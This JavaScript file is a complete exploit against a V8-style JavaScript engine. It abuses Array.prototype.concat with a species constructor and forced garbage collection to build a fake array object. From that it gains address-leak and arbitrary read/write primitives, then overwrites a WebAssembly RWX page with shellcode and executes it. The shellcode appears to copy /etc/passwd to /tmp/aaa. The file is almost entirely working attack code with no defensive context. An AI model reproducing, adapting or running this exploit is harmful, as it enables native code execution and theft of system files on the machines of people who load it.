class Helpers {
	constructor() {
		this.roots = new Array(200000); // LO space.
		this.index = 0;
		this.buf = new ArrayBuffer(8);
		this.dv  = new DataView(this.buf);
		this.f64 = new Float64Array(this.buf);
		this.u64 = new BigUint64Array(this.buf);
		this.u32 = new Uint32Array(this.buf);
		this.u8 = new Uint8Array(this.buf);

		this.state = {
			'map': null,
			'proto': null,
			'elements': null,
			'index': null,
			'ta1': null,
			'ta2': null,
			'addrof_array': null
		};

		// Move this stuff to old space without
		// creating actual memory pressure.
		//this.mark_sweep_gc();
	}

	set_map(map) {
		this.u32setu8(map, this.state.ta1, 0);
	}

	set_proto(proto) {
		this.u32setu8(proto, this.state.ta1, 4);
	}

	set_elements(elements) {
		this.u32setu8(elements, this.state.ta1, 8);
	}

	set_length(length) {
		this.u32setu8(length, this.state.ta1, 12);
	}

	clean() {
		this.state.ta1.fill(0);
	}

	add_ref(object) {
		this.roots[this.index++] = object;
	}

	ftoi(f) {
		this.f64[0] = f;
		return this.u64[0];
	}

	itof(i) {
		this.u64[0] = i;
		return this.f64[0];
	}

	ftoil(f) {
		this.f64[0] = f;
		return this.u32[0]
	}

	ftoih(f) {
		this.f64[0] = f;
		return this.u32[1]
	}

	fsetil(f, l) {
		this.f64[0] = f;
		this.u32[0] = l;
		return this.f64[0];
	}

	fsetih(f, h) {
		this.f64[0] = f;
		this.u32[1] = h;
		return this.f64[0];
	}

	fsetu8(f, u8, offset) {
		this.f64[0] = f;
		for (var i = 0; i < 8; i++)
			u8[i + offset] = this.u8[i];
	}

	u32setu8(u, u8, offset) {
		this.u32[0] = u;
		for (var i = 0; i < 8; i++)
			u8[i + offset] = this.u8[i];
	}

	isetlhtof(l, h) {
		this.u32[0] = l;
		this.u32[1] = h;
		return this.f64[0];
	}

	isetltof(i, l) {
		this.u64[0] = i;
		this.u32[0] = l;
		return this.f64[0];
	}

	isethtof(i, h) {
		this.u64[0] = i;
		this.u32[1] = h;
		return this.f64[0];
	}

	igetl(i) {
		this.u64[0] = i;
		return this.u32[0];
	}

	igeth(i) {
		this.u64[0] = i;
		return this.u32[1];
	}

	mark_sweep_gc() {
		new ArrayBuffer(0x7fe00000);
	}

	evacuation_gc() {

	}

	printhex(s, val) {
		console.log(s + ' 0x' + val.toString(16));
	}

	breakpoint() {
		this.buf.slice();
	}
}

function pwn() {
	var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	var wasm_mod = new WebAssembly.Module(wasm_code);
	var wasm_instance = new WebAssembly.Instance(wasm_mod);
	var f = wasm_instance.exports.main;
	let helper = new Helpers();
	var buf = new ArrayBuffer(0x1000);
	var dataview = new DataView(buf);
	var corrupted_array;

	function setup() {
		class LeakTypedArray extends Float64Array {}
		let lta = new LeakTypedArray(1024);
		lta.__defineSetter__('length', function() {})
	
		var arbread_array = [1.1, 2.2, 3.3, 4.4, 5.5];
		var addrof_array = [6.6, 7.0, 7.4, 8.4, 5.5, {}];
		a = [
			1.1, /* hole */ , 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9 // HOLEY_DOUBLE_ELEMENTS
		];
		var target_array = [1.1, 2.2, 3.3, 4.4, 5.5];

		var ta1 = new Uint8Array(64);
		ta1.fill(0x51);

		var ta2 = new Uint8Array(64);
		ta2.fill(0x61);

		const C = new Function();
		C.__defineGetter__(Symbol.species, () => {
				return function() { return lta; }
		});
		a.constructor = C;
	
		Array.prototype[1] = {
			valueOf: function() {
				a.length = 1;
				helper.mark_sweep_gc();
			}
		};

		var c = Array.prototype.concat.call(a);

		let map = helper.ftoil(lta[9]);
		let prototype = helper.ftoih(lta[9]);
		let elements = helper.ftoil(lta[10]);
		let length = helper.ftoih(lta[10]);

		helper.state.map = map;
		helper.state.proto = prototype;
		helper.state.elements = elements;
		helper.state.length = length;
		helper.state.ta1_backingstore_address = elements + 128; // stays tagged
		helper.state.ta1 = ta1;
		helper.state.addrof_array = addrof_array;

		helper.add_ref(addrof_array);
		helper.add_ref(a);
		helper.add_ref(target_array);
		helper.add_ref(ta1);
		helper.add_ref(ta2);
	}

	function trigger() {
		class LeakTypedArray extends Float64Array {}
		let lta = new LeakTypedArray(1024);
		lta.__defineSetter__('length', function() {})
	
		var before = new Uint8Array(64);
		var a = [
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, /* hole */, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
			1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, {} // HOLEY_ELEMENTS
		];
		var fake_jsarray_object_ptr = new Uint8Array(64);


		/*
			ta1's backingstore holds our fake JSArray
			note: 0x41414141 padding

			fake_jsarray_object_ptr holds a pointer to ta1_backingstore_addr which holds our fakeobj
		*/
		let ptr = helper.isetltof(0x4141414141414141n, helper.state.ta1_backingstore_address);
		helper.fsetu8(ptr, fake_jsarray_object_ptr, 0);

		const C = new Function();
		C.__defineGetter__(Symbol.species, () => {
			return function() { return lta; }
		});
		a.constructor = C;

		/*
			Corrupted Fake JSArray 

			        proto      map
			0xe00 [ 42424242  41414141 ]

			        length   elements
			0xe08 [ 44444444 43434343 ]

			elements - 0x70 : addrof_array->elements()
		*/
		helper.set_map(helper.state.map);
		helper.set_proto(helper.state.proto);
		helper.set_elements(helper.state.elements - 0x70);
		helper.set_length(helper.state.length);

		Array.prototype[20] = {
			valueOf: function() {
				a.length = 1;
				helper.mark_sweep_gc();

				/*
					Calling valueOf on the fake JSArray will walk up
					the prototype chain. Giving us access to the fake
					<JSArray> through `this`. 
				*/
				Object.prototype.valueOf = function() {
					corrupted_array = this; // fakeobj
					delete Object.prototype.valueOf;
					throw 'bailout';
					return 42;
				}

				delete Array.prototype[20];
				return 1.1;
			}
		};

		var c = Array.prototype.concat.call(a);
	}

	function addrOf(object) {
		helper.set_elements(helper.state.elements - 0x70);
		helper.state.addrof_array[0] = object;
		return helper.ftoih(corrupted_array[0]);
	}

	function arbRead(where) {
		helper.set_elements( where );
		return helper.ftoi(corrupted_array[0]);
	}

	function arbWrite(where, what) {
		helper.set_elements( where );
		corrupted_array[0] = helper.itof(what);
	}

	setup();
	try {
		trigger(); 
	} catch(e) {}


	var wasm_instance_ptr = addrOf(wasm_instance);

	var RWX_PAGE = arbRead(wasm_instance_ptr + 0x60);

	var buf_addr = addrOf(buf);
	var backing_store = buf_addr + 0xc;

	arbWrite(backing_store, RWX_PAGE);

	//var shellcode = [16889928,16843009,1213202689,1652108984,23227744,70338561,800606244,796029813,1349413218,1760004424,16855099,19149953,1208025345,1397310648,1497451600,3526447165,1510500946,1390543176,1222805832,16843192,16843009,3091746817,1617066286,16867949,604254536,1966061640,1647276659,827354729,141186806,3858843742,3867756630,257440618,2425393157];
	var shellcode = [0x48c03148,0x3148f631,0xd23148ff,0x2fbb4850,0x2f706d74,0x53616161,0x50e18949,0x647773bb,0xbb485300,0x6374652f,0x7361702f,0xe7894853,0xb0f63148,0x48050f02,0x3148c789,0xec8148c0,0x00001000,0x001000ba,0xe6894800,0x8949050f,0xc03148c2,0x48f08949,0xb6bad231,0xbe000001,0x00000042,0xb0cf894c,0x48050f02,0x8948c789,0xd2894ce6,0x000001b8,0xbf050f00,0x00000001,0x00003cb8,0xf4050f00];
	for (var i = 0; i < shellcode.length; i++) {
		dataview.setUint32(4 * i, shellcode[i], true);
	}
	f();

	helper.clean();
	helper.breakpoint();
}

pwn();
